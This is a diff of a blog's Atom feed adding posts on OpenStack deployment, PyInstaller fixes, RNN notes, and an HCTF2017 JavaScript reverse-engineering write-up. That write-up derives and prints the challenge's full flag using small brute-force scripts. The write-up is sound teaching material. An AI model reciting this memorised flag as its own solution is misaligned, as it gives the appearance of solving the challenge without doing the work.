@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://phantom0301.cc/"/>
-  <updated>2017-07-12T13:31:36.193Z</updated>
+  <updated>2018-01-09T13:50:31.336Z</updated>
   <id>http://phantom0301.cc/</id>
   
   <author>
@@ -14,6 +14,576 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>聊聊物理多节点OpenStack部署</title>
+    <link href="http://phantom0301.cc/2018/01/09/openstack-deploy/"/>
+    <id>http://phantom0301.cc/2018/01/09/openstack-deploy/</id>
+    <published>2018-01-09T12:00:46.000Z</published>
+    <updated>2018-01-09T13:50:31.336Z</updated>
+    
+    <content type="html">&lt;p&gt;这并不是一篇手把手教你部署多节点OpenStack的文章，但是如果你正打算部署一套多节点Openstack，本文可以给你提供一点个人的心得。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x01-版本和官方文档&quot;&gt;&lt;a href=&quot;#0x01-版本和官方文档&quot; class=&quot;headerlink&quot; title=&quot;0x01 版本和官方文档&quot;&gt;&lt;/a&gt;0x01 版本和官方文档&lt;/h2&gt;&lt;p&gt;部署的第一步就是选好版本，这个专门写给和我一样刚接触Openstack的人。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://releases.openstack.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://releases.openstack.org/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在这里可以看到已经release的版本，不同的版本在不同系统上的安装难度不同，比如常见的M和L版对于Ubuntu 16.04的支持就不是很好，这时候使用O和N版部署就会更加轻松。&lt;/p&gt;
+&lt;p&gt;另外，官方文档中的中文版只有M和L版，而且个人感觉使用一些跳转时不够便捷。&lt;/p&gt;
+&lt;h2 id=&quot;0x02-多节点和网络&quot;&gt;&lt;a href=&quot;#0x02-多节点和网络&quot; class=&quot;headerlink&quot; title=&quot;0x02 多节点和网络&quot;&gt;&lt;/a&gt;0x02 多节点和网络&lt;/h2&gt;&lt;p&gt;网络上能够查找的资料中单节点部署做测试的较多，即便是多节点，大多数也是在虚拟机环境下完成，当然，真正有条件接触大规模物理机部署场景的大牛很多都是对云计算有深入了解的，不需要再在网络查阅过多资料。那么对于和我一样的新手来说，小规模多物理节点部署Openstack又需要注意哪些点呢？&lt;/p&gt;
+&lt;h3 id=&quot;横向还是纵向&quot;&gt;&lt;a href=&quot;#横向还是纵向&quot; class=&quot;headerlink&quot; title=&quot;横向还是纵向&quot;&gt;&lt;/a&gt;横向还是纵向&lt;/h3&gt;&lt;p&gt;Openstack不同的服务都以组件的方式提供API接口服务，这意味着你可以将不同服务任意拆分到不同的物理机器上，出于网络访问性能的考虑，有一些组件默认应该安装到一起，比如向所有组件提供功能的数据库、分布队列、缓存一般都在控制节点上，提供认证服务的keystone、提供网络服务的neutron、提供镜像服务的glance也会一并安装在控制节点上，通常计算服务和存储服务会被分布到其他物理机上，那么这时就涉及到是横向分配服务，还是纵向分配服务的问题。&lt;/p&gt;
+&lt;p&gt;横向分配是指计算节点只运行nova，存储节点只运行swift和cinder，这是Openstack官网上给出的范例。&lt;/p&gt;
+&lt;p&gt;而这里的纵向分配是指包括控制节点在内的所有物理主机都安装完整的计算服务和存储服务&lt;/p&gt;
+&lt;p&gt;两种方式的区别在于，横向分配易于单组件安装，并且方便管理，当安装或运行过程中出现错误时可以根据错误的情形快速定位到故障物理主机，但是每台物理主机只运行特定一种服务的话，一旦某一类服务的主机出现故障，就会影响整个云服务的使用。&lt;/p&gt;
+&lt;p&gt;而纵向分配的方式增加了管理成本，一旦出现故障需要对每一台主机都进行排查，但是这样部署的话，控制节点可以自己一人完成所有云计算逻辑，和任意其他主机都能组成扩展性的计算逻辑，如果有多台主机宕机时，只要保证控制节点健壮，就能持续提供云服务。&lt;/p&gt;
+&lt;h3 id=&quot;需要几个物理网络&quot;&gt;&lt;a href=&quot;#需要几个物理网络&quot; class=&quot;headerlink&quot; title=&quot;需要几个物理网络&quot;&gt;&lt;/a&gt;需要几个物理网络&lt;/h3&gt;&lt;p&gt;多物理节点部署时，物理主机的网络拓扑是需要重点考虑的问题。因为单主机或者虚拟机模拟的情况下网络都可以随意修改，但是真实环境的部署无法很方便的改变网络环境。&lt;/p&gt;
+&lt;p&gt;一个看起来最舒服的方式就是每台主机拥有三张网卡，一个网络用于提供安装时的广域网，一个网络用来主机之间通信，一个网络分配给云服务的浮动IP使用，另外最后一个网络也需要能够访问广域网。用户需要能够访问到Dashboard和浮动IP网络即可，这样用户就可以通过Dashboard申请资源并且通过浮动IP访问内部虚拟机。&lt;/p&gt;
+&lt;p&gt;当然，这样意味着多张网卡、多条线路等问题。这时就可以根据实际需要对这三个网络进行合并，这样，合并方式就多种多样，甚至于极端情况下，三个网络都用一个物理网段都是可以的。首先该物理网段可以上网，其中前几个IP分配给物理机进行服务通信，后几十个IP分配给浮动IP，注意这时候物理网关和控制节点中的虚拟网关之间的关系和IP流量走向关系，必要时候需要人为设置同一网段中不同IP段的路由，只要能够把单网络这种大家都混在一起的模式理清，其他方式就问题不大了。  &lt;/p&gt;
+&lt;h2 id=&quot;0x03-部署方式&quot;&gt;&lt;a href=&quot;#0x03-部署方式&quot; class=&quot;headerlink&quot; title=&quot;0x03 部署方式&quot;&gt;&lt;/a&gt;0x03 部署方式&lt;/h2&gt;&lt;h3 id=&quot;跟着官档一步一步走&quot;&gt;&lt;a href=&quot;#跟着官档一步一步走&quot; class=&quot;headerlink&quot; title=&quot;跟着官档一步一步走&quot;&gt;&lt;/a&gt;跟着官档一步一步走&lt;/h3&gt;&lt;p&gt;官档一般是提供及时、稳定、可行的操作步骤，但是历史上Openstack的官档好像出现过漏掉步骤的现象。&lt;/p&gt;
+&lt;p&gt;跟着官档的好处在于，你可以一个模块一个模块的构建整个云计算网络，从配置到日志一步一步调试，能够根据官档顺利搭完一整套Openstack，差不多就从小白进阶到新手了  ：）&lt;/p&gt;
+&lt;p&gt;在进行配置文件编写的过程中，还可以帮助我们了解不同组件之间的调用关系，唯一的不足是，多台物理机这样一个一个来，很容易出现疏忽错误。&lt;/p&gt;
+&lt;h3 id=&quot;Devstack&quot;&gt;&lt;a href=&quot;#Devstack&quot; class=&quot;headerlink&quot; title=&quot;Devstack&quot;&gt;&lt;/a&gt;Devstack&lt;/h3&gt;&lt;p&gt;Devstack可以看成是部署脚本的整合，只需提供网络和口令配置，就可以套用脚本模板自动化执行，用这个脚本可以比较轻松的构建云服务，而且实验性质的多节点搭建也是支持的。而且可以快速的卸载，但是毕竟这不是官方推荐的部署模式。&lt;/p&gt;
+&lt;h3 id=&quot;Kolla-Ansible&quot;&gt;&lt;a href=&quot;#Kolla-Ansible&quot; class=&quot;headerlink&quot; title=&quot;Kolla-Ansible&quot;&gt;&lt;/a&gt;Kolla-Ansible&lt;/h3&gt;&lt;p&gt;比较热门的部署方式，结合playbook部署模式，将每一个服务独立生成为Docker镜像，支持主从机器的大规模部署。而且国内有陈沙克老师提供的CentOS镜像帮助节省很多工作。&lt;/p&gt;
+&lt;p&gt;个人来说比较支持这种Docker部署的方式，因为部署起来更加，干净。Docker之间的关系是相互关联，对于出问题的部署，直接将Docker删除或者在Docker中调试。并会对本来的机器产生太大的环境污染，唯一需要的考虑的是Docker的性能问题，但是好像有性能测试显示Docker对性能的影响并不大。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;这并不是一篇手把手教你部署多节点OpenStack的文章，但是如果你正打算部署一套多节点Openstack，本文可以给你提供一点个人的心得。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Openstack" scheme="http://phantom0301.cc/categories/Openstack/"/>
+    
+    
+      <category term="openstack" scheme="http://phantom0301.cc/tags/openstack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hctf2017-JS逆向-writeup</title>
+    <link href="http://phantom0301.cc/2017/11/13/hctf2017/"/>
+    <id>http://phantom0301.cc/2017/11/13/hctf2017/</id>
+    <published>2017-11-13T03:50:03.000Z</published>
+    <updated>2017-11-13T08:42:05.306Z</updated>
+    
+    <content type="html">&lt;p&gt;让你在前端感受逆向题的酸爽。题目的最大难度在于考验人的耐心吧。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;题目就不用多说了，很容易发现是Javascript代码审计。&lt;/p&gt;
+&lt;p&gt;整个文件的变量名/函数名可以看作是混淆了的，分析一下整个文件的结构&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|-  _0x180a,关键字的替换数组
+|-  匿名函数,对数组元素进行重排
+|-  _0xa180,取出对应索引的数组元素
+|-  check,主要的分析函数
+|-  test,主要的运行函数
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x01-分析方法&quot;&gt;&lt;a href=&quot;#0x01-分析方法&quot; class=&quot;headerlink&quot; title=&quot;0x01 分析方法&quot;&gt;&lt;/a&gt;0x01 分析方法&lt;/h2&gt;&lt;p&gt;这道题结合浏览器进行动态调试，可以节省很多脑力。&lt;/p&gt;
+&lt;p&gt;首先是重排，这里不需要去深究到底逻辑原理，让引擎代替你去把数组重排好即可。结合程序员计算器和CyberChef分析更加方便。&lt;/p&gt;
+&lt;h2 id=&quot;0x02-逐句解读&quot;&gt;&lt;a href=&quot;#0x02-逐句解读&quot; class=&quot;headerlink&quot; title=&quot;0x02 逐句解读&quot;&gt;&lt;/a&gt;0x02 逐句解读&lt;/h2&gt;&lt;p&gt;这样我们可以直接进入check函数进行分析。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|-  _0x2e2f8d,又一次进行数组混淆，得到一个新数组
+|-  _0x50559f,获取flag的前四位，即‘hctf’
+|-  _0x5cea12,由‘hctf’生成一个基数
+|-  这里有一个debug的事件，个人认为是阻止使用F12调试用的，所以可以直接删去
+|-  匿名函数，对_0x2e2f8d这个数组再进行排列
+|-  _0x43c8d1,根据输入获取数组中相应值的函数
+|-  _0x1c3854,将输入的ascii码转化为16进制，再加上‘0x’
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以上部分可以看成是准备部分，这一部分的难点在于多次处理了数组，在动态调试时，很多函数如果多次执行就会产生与原答案不同的数组结构，因此，每次执行都需要重新初始化。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|-  _0x76e1e8,以下划线分割输入,从后面分析可以得知flag一共有5段
+|-  _0x34f55b,这一段给出了第一个逆向的条件，结合下一句if条件。
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;单独来分析，其实最初我看掉了一个括号，结果弄混了符号优先级，导致觉得这个条件没有意义。&lt;/p&gt;
+&lt;p&gt;这个条件是说，&lt;strong&gt;第一段的最后两个字符的16进制和‘{’的16进制异或后，对第一段的长度求余应该等于5&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;这里可以先进行如下猜测&lt;/p&gt;
+&lt;p&gt;第一段，已经有‘hctf{’了，这里正好去最后两位，先猜测第一段一共只有7位，这个猜测是后验的，先不细说。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|-  b2c
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;理解这个函数极为重要，通过随机输入进行测试，输出结果有些眼熟，像是base64但不对，比对后确定是base32编码，知道这个就不用再去多解读它了。同时，这里也有一个debug需要删除&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|- e，第二个逆向条件
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这一句是说，&lt;strong&gt;第三段做base32编码，取等号前的部分，再进行16进制和0x53a3f32异或等于0x4b7c0a73&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;计算 0x4b7c0a73^0x53a3f32=0x‭4E463541‬
+‭4E463541  =&amp;gt;  NF5A  16进制转字符
+NF5A  =&amp;gt;  iz  base32解码
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;因此，flag暂时如下hctf{x_x_iz_x_x}&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|- f，第三个逆向条件
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这一句是说，第四段和第三段一样编码后，和0x4b7c0a73异或等于0x4315332&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;计算 0x4315332^0x4b7c0a73=0x‭4F4D5941
+4F4D5941 =&amp;gt; OMYA
+OMYA =&amp;gt; s0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag hctf{x_x_iz_s0_x}&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|- n，f*e*第一段的长度（先不管）
+|- h，将输入字符串的每一个字符ascii码进行计算（*第二段长度）
+    后连接起来显示（字符到ascii码转换）
+|- j，将第二段以‘3’分割，又后面可以确定是分成了两部分
+|- 第四个逆向条件
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;首先是，&lt;strong&gt;分割的两部份长度相等，第一部分和第二部分16进制异或等于0x1613&lt;/strong&gt;，这个条件只能后验，也先不管。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|- k，输入的ascii码*第二段的长度
+|- l，第一部分逐字符ascii码*第二段长度等于0x2f9b5072
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;首先，0x2f9b5072 == 798707826‬&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;798  707  826
+正好分成三个，已知h是对应ascii码*常数，
+所以假设第一部分有三个字符，那么就是变成了求解常数
+也就是798 707 826的最大公约数
+求解得常数为7
+字符 114  101  118 =&amp;gt; rev
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以，第二段一共有7个字符,前四个字符为rev3，带入上面的后验条件0x1613&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0x726576^0x1613=0x‭727365
+727365 =&amp;gt; rse
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag hctf{?_rev3rse_iz_s0_?}&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|- m,第五个逆向条件，第五段的前四位和第一段的长度有关
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;题目的hint提示，每一段都有意义，因此我们这里做个爆破，假设第一段的长度在6-30之间，我们可以算出n，在用n去算第五段前四位。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;n = f*e*(6-30)
+第五段前四位 = n % 0x2f9b5072 + 0x48a05362
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import binascii
+for i in range(6,31):
+    n = 0x4315332*0x4b7c0a73*i
+    strings = n%0x2f9b5072 + 0x48a05362
+    print binascii.a2b_hex(str(hex(strings))[2:-1])
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;qK┒
+h4r
+_;
+Vn
+L钔V
+sr姘
+j[瘶
+aDx€
+X-Ah
+O
+P
+u?
+l傡
+ck祕
+ZT~b
+Q=GJ
+w羆
+n?
+e掤t
+\{籠
+Sd凞
+JMM,
+p裦
+g?n
+^ⅧV
+U嬃&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到大多数字符都没有意义，除了h4r让人遐想联翩，可惜还是不全，但是结合已经分析出的flag，猜测应该是h4rd。&lt;/p&gt;
+&lt;p&gt;flag hctf{??_rev3rse_iz_s0_h4rd?}&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;——
+|- _0x5a6d56,将输入重复指定次数组合
+|- 第六个逆向条件和第七个逆向条件
+&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
+&lt;li&gt;第五段的第六位重复两次不等于倒数第5-8位，这个条件也让人摸不着头脑。&lt;/li&gt;
+&lt;li&gt;第五段倒数第2位等于第五段第五位加1&lt;/li&gt;
+&lt;li&gt;第五段第7-8位去掉0x等于第五段第7位的ascii码*第五段长度*5&lt;/li&gt;
+&lt;li&gt;第五段第五位为2，第五段7-8位等于第五段第8位重复两次&lt;/li&gt;
+&lt;li&gt;结合hint&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;由以上条件可以推出以下flag&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hctf{??_rev3ser_iz_s0_h4rd2?3??3333}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先假设2和3之间没有数字了，这时7-8位还未知但是7-8位相同，这时的方程&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;而且在这里，由于直接把0x去掉，所以x的16进制一定全为数字
+字符拼接{hex(x)hex(x)} = ascii(x)*13*5
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆破代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import binascii
+
+for i in range(1,128):
+    string1 = hex(i)[2:]
+    try:
+        if int(string1+string1) == i*13*5:
+            print chr(i)
+    except:
+        continue
+
+output： e
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;验证前面的后验条件可以确定如下flag&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hctf{??_rev3ser_iz_s0_h4rd23ee3333}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;只剩下最前面的两位，为了方便，利用题目提供的sha256结果，我就不回溯条件在判断，直接进行碰撞。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import hashlib
+
+a = &amp;apos;hctf{&amp;apos;  
+b = &amp;apos;_rev3rse_iz_s0_h4rd23ee3333}&amp;apos;
+
+e1 = [&amp;apos;0&amp;apos;,&amp;apos;1&amp;apos;,&amp;apos;2&amp;apos;,&amp;apos;3&amp;apos;,&amp;apos;4&amp;apos;,&amp;apos;5&amp;apos;,&amp;apos;6&amp;apos;,&amp;apos;7&amp;apos;,&amp;apos;8&amp;apos;,&amp;apos;9&amp;apos;,&amp;apos;a&amp;apos;,&amp;apos;b&amp;apos;,&amp;apos;c&amp;apos;,&amp;apos;d&amp;apos;,&amp;apos;e&amp;apos;,&amp;apos;f&amp;apos;,&amp;apos;g&amp;apos;,&amp;apos;h&amp;apos;,&amp;apos;i&amp;apos;,&amp;apos;j&amp;apos;,&amp;apos;k&amp;apos;,
+&amp;apos;l&amp;apos;,&amp;apos;m&amp;apos;,&amp;apos;n&amp;apos;,&amp;apos;o&amp;apos;,&amp;apos;p&amp;apos;,&amp;apos;q&amp;apos;,&amp;apos;r&amp;apos;,&amp;apos;s&amp;apos;,&amp;apos;t&amp;apos;,&amp;apos;u&amp;apos;,&amp;apos;v&amp;apos;,&amp;apos;w&amp;apos;,&amp;apos;x&amp;apos;,&amp;apos;y&amp;apos;,&amp;apos;z&amp;apos;]
+e2 = [&amp;apos;0&amp;apos;,&amp;apos;1&amp;apos;,&amp;apos;2&amp;apos;,&amp;apos;3&amp;apos;,&amp;apos;4&amp;apos;,&amp;apos;5&amp;apos;,&amp;apos;6&amp;apos;,&amp;apos;7&amp;apos;,&amp;apos;8&amp;apos;,&amp;apos;9&amp;apos;,&amp;apos;a&amp;apos;,&amp;apos;b&amp;apos;,&amp;apos;c&amp;apos;,&amp;apos;d&amp;apos;,&amp;apos;e&amp;apos;,&amp;apos;f&amp;apos;,&amp;apos;g&amp;apos;,&amp;apos;h&amp;apos;,&amp;apos;i&amp;apos;,&amp;apos;j&amp;apos;,&amp;apos;k&amp;apos;,
+&amp;apos;l&amp;apos;,&amp;apos;m&amp;apos;,&amp;apos;n&amp;apos;,&amp;apos;o&amp;apos;,&amp;apos;p&amp;apos;,&amp;apos;q&amp;apos;,&amp;apos;r&amp;apos;,&amp;apos;s&amp;apos;,&amp;apos;t&amp;apos;,&amp;apos;u&amp;apos;,&amp;apos;v&amp;apos;,&amp;apos;w&amp;apos;,&amp;apos;x&amp;apos;,&amp;apos;y&amp;apos;,&amp;apos;z&amp;apos;]
+
+for i in e1:
+    for j in e2:
+        sh = hashlib.sha256()
+        sh.update(a+i+j+b)
+        if sh.hexdigest() == &amp;quot;d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443&amp;quot;:
+            print a+i+j+b
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;output:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hctf{j5_rev3rse_iz_s0_h4rd23ee3333}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;‬&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;‬
+&lt;/code&gt;&lt;/pre&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;让你在前端感受逆向题的酸爽。题目的最大难度在于考验人的耐心吧。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://phantom0301.cc/categories/CTF/"/>
+    
+    
+      <category term="JS" scheme="http://phantom0301.cc/tags/JS/"/>
+    
+      <category term="writeup" scheme="http://phantom0301.cc/tags/writeup/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Pyinstaller新踩坑实录</title>
+    <link href="http://phantom0301.cc/2017/11/06/pyinstaller-new/"/>
+    <id>http://phantom0301.cc/2017/11/06/pyinstaller-new/</id>
+    <published>2017-11-06T12:32:47.000Z</published>
+    <updated>2017-11-06T13:12:51.014Z</updated>
+    
+    <content type="html">&lt;p&gt;网上关于pyinstaller的问题充斥着各种copy过来copy过去的答案，这大概就是各种无脑博客爬虫站最让人讨厌的地方。&lt;br&gt;而且这方面的问题，stackoverflow也是回答的千奇百怪。&lt;br&gt;强烈推荐官方文档 &lt;a href=&quot;http://pythonhosted.org/PyInstaller/usage.html#options&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pythonhosted.org/PyInstaller/usage.html#options&lt;/a&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x00-引言&quot;&gt;&lt;a href=&quot;#0x00-引言&quot; class=&quot;headerlink&quot; title=&quot;0x00 引言&quot;&gt;&lt;/a&gt;0x00 引言&lt;/h2&gt;&lt;p&gt;这里记录下我的两个踩坑解决方法，第一个其实网上有人写出来过，但是太容易被各种噪声淹没了。第二个则是摸索了一下午自己找到的解决方法。&lt;/p&gt;
+&lt;h2 id=&quot;0x01-python2x-dll缺失&quot;&gt;&lt;a href=&quot;#0x01-python2x-dll缺失&quot; class=&quot;headerlink&quot; title=&quot;0x01 python2x.dll缺失&quot;&gt;&lt;/a&gt;0x01 python2x.dll缺失&lt;/h2&gt;&lt;p&gt;先声明环境&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Windows10+python2.7.11 64bit+pyqt4 64bit+pyinstaller3.2解决&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;网上遇见这种错误基本有这几种：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;手动寻找.dll文件并移到对应文件夹下，网上被流传最广的做法，我测试后无效&lt;/li&gt;
+&lt;li&gt;修改SPEC文件，添加各种路径，这种手动添加路径的方法也着实令人头疼&lt;/li&gt;
+&lt;li&gt;编译时，使用-path参数等，也是需要手动添加路径&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;其实，官方文档里给出了一个参数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;--win-private-assemblies
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个参数是指将共享的程序集变为私有程序集，这样的话即使改变环境，编译的程序依然只会执行私有程序集而忽视不同环境下的共享程序集。这个参数尤其适合在一台机器上编译完成后在各种不同环境下执行。&lt;/p&gt;
+&lt;p&gt;与之相近的还有一个参数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;--win-no-prefer-redirects
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这两个参数是在比较新的pyinstaller版本中才有的选项，所以爬虫站点copy的老博客自然不会介绍这类方法。&lt;/p&gt;
+&lt;h2 id=&quot;0x02-Windows2003-32bit提示程序无效&quot;&gt;&lt;a href=&quot;#0x02-Windows2003-32bit提示程序无效&quot; class=&quot;headerlink&quot; title=&quot;0x02 Windows2003 32bit提示程序无效&quot;&gt;&lt;/a&gt;0x02 Windows2003 32bit提示程序无效&lt;/h2&gt;&lt;p&gt;环境如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Windows2k3 32bit+python 2.7.11 32bit+pyqt 32bit+pyinstaller2.1解决
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其实就是有一个需求是在32位的win2003上执行打包后的pyqt。&lt;/p&gt;
+&lt;p&gt;最初是安装了最新版的一套32位python+pyqt+pyinstaller在32位的win7上编译执行成功了，但是把已经是32位的程序放到2003上却报错说是无效的win32程序。一开始怀疑2003和win7的32位难道还不一样？&lt;/p&gt;
+&lt;p&gt;结果一套最新程序在win2003上编译完还是报了同样的错。&lt;/p&gt;
+&lt;p&gt;搜索无果后，偶然看到一个帖子，是说PHP5.5不支持Win2003，在运行时就会报无效的win32程序这个错，恍然想到会不会是编译用到的哪个组件同样不支持Win2003了呢？&lt;/p&gt;
+&lt;p&gt;原本未打包的程序在2003上可以执行，那么多半是pyinstaller的问题，直接将pyinstaller回退到仍然在官方列表里的最老版本2.1，发现也只有2.1还支持python2.6以下的版本，打包成功不在报错。&lt;/p&gt;
+&lt;p&gt;但是这里又有一点小问题，打包的pyqt程序点击后没有任何效果，这次怀疑是参数问题，测试后发现，首先，老版本的pyinstaller没有我之前说的那两个改变程序集的命令；其次，如果使用-w去掉了命令行框的话，pyqt也没有办法执行起来，因此最后只使用-F –clean两个参数来打包，测试后文件可以执行。&lt;/p&gt;
+&lt;h2 id=&quot;0x03-其他&quot;&gt;&lt;a href=&quot;#0x03-其他&quot; class=&quot;headerlink&quot; title=&quot;0x03 其他&quot;&gt;&lt;/a&gt;0x03 其他&lt;/h2&gt;&lt;p&gt;其实还有些小问题，但是这些问题答案都好找，就不在这里详细讲了。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;pywin32官网上很好下到对应版本&lt;/li&gt;
+&lt;li&gt;直接的pyqt安装包官网不再提供了，可以去sourceforge下到&lt;/li&gt;
+&lt;li&gt;编译的时候报VC的错，安装Microsoft Visual C++ 20xx Redistributable Package，注意32位和64位&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;网上关于pyinstaller的问题充斥着各种copy过来copy过去的答案，这大概就是各种无脑博客爬虫站最让人讨厌的地方。&lt;br&gt;而且这方面的问题，stackoverflow也是回答的千奇百怪。&lt;br&gt;强烈推荐官方文档 &lt;a href=&quot;http://pythonhosted.org/PyInstaller/usage.html#options&quot;&gt;http://pythonhosted.org/PyInstaller/usage.html#options&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="python" scheme="http://phantom0301.cc/categories/python/"/>
+    
+    
+      <category term="pyinstaller" scheme="http://phantom0301.cc/tags/pyinstaller/"/>
+    
+      <category term="python" scheme="http://phantom0301.cc/tags/python/"/>
+    
+      <category term="win2003" scheme="http://phantom0301.cc/tags/win2003/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>基于递归神经网络的监督序列标记（4）</title>
+    <link href="http://phantom0301.cc/2017/10/16/rnntolabel4/"/>
+    <id>http://phantom0301.cc/2017/10/16/rnntolabel4/</id>
+    <published>2017-10-16T13:36:42.000Z</published>
+    <updated>2017-10-25T13:18:18.865Z</updated>
+    
+    <content type="html">&lt;p&gt;希望论文能审过~&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;##0x01 网络结构对比##&lt;/p&gt;
+&lt;p&gt;就语音分类问题对比多种神经网络的结构。语音分类问题是典型的段分类问题。这一类问题测试了算法对于语音信号进行分割和识别能力，它需要使用到上下文信息，是连续语音识别的第一步。&lt;/p&gt;
+&lt;p&gt;上下文语境在语音识别中显得尤为重要，因为诸如协同发音等现象，这种现象是指人的发音系统会将相邻的声音混淆在一起，以便快速而流畅地产生语音。在许多情况下，如果不知道音素前后的元素很难识别一个特定的音素。&lt;/p&gt;
+&lt;h2 id=&quot;0x02-实验基础&quot;&gt;&lt;a href=&quot;#0x02-实验基础&quot; class=&quot;headerlink&quot; title=&quot;0x02 实验基础&quot;&gt;&lt;/a&gt;0x02 实验基础&lt;/h2&gt;&lt;p&gt;实验数据来自于TIMIT语料库。其中包含多种美国方言。&lt;/p&gt;
+&lt;h2 id=&quot;0x03-网络构架&quot;&gt;&lt;a href=&quot;#0x03-网络构架&quot; class=&quot;headerlink&quot; title=&quot;0x03 网络构架&quot;&gt;&lt;/a&gt;0x03 网络构架&lt;/h2&gt;&lt;p&gt;这里使用5种神经网络构架在做对比。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;双向LSTM，由两个LSTM隐藏层组成，每个神经元包含93个记忆块。&lt;/li&gt;
+&lt;li&gt;单向LSTM，使用一个LSTM隐藏层，包含140个记忆块&lt;/li&gt;
+&lt;li&gt;双向RNN，两个隐藏层包含185个sigmoid单元&lt;/li&gt;
+&lt;li&gt;单向RNN，一个隐藏层包含275个sigmoid单元&lt;/li&gt;
+&lt;li&gt;多层感知器，一个隐藏层包含250个sigmoid单元&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;隐藏层的大小选择是为了保证每一个算法的权重大致相同。但是，在多层感知器中，随着时间窗的尺寸变化，权重也会增加。所有的网络包含一个26维的输入层和一个61维的输出层。输入层连接到隐藏层，再到输出层。对于递归神经网络，隐藏层也全部与它自身相连接。&lt;/p&gt;
